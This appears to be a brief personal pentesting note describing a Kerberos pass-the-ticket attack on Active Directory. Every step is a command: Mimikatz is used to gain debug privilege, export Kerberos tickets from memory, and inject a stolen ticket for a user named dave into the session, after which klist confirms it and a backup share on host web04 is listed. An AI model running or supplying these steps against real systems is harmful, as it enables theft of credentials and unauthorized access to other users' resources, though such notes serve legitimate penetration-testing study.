#activedirectory #pth #ptt

1. Export the ticket

```mimikatz
privilege::debug
```

```mimikatz
sekurlsa::tickets /export
```

2. check for tickets in the directory

```powershell
dir *.kirbi
```

3. Select a ticket and inject to the memory

```mimikatz
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

4. Check if its loaded

```powershell
klist
```

5. Access the object

```powershell
ls \\web04\backup
```

